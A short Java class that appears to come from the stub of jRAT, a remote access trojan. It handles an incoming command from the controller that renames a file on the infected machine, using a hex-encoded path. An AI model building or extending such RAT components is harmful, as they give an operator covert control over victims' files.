package pro.jrat.stub.packets.incoming;

import java.io.File;

import pro.jrat.common.codec.Hex;
import pro.jrat.stub.Connection;

public class Packet47RenameFile extends AbstractIncomingPacket {

	public void read() throws Exception {
		String file = Connection.readLine();
		String newname = Connection.readLine();

		File f = new File(Hex.decode(file.substring(2, file.length())));
		File fto = new File(f.getAbsolutePath().replace(f.getName(), "") + newname);
		if (f.exists()) {
			f.renameTo(fto);
		}
	}

}
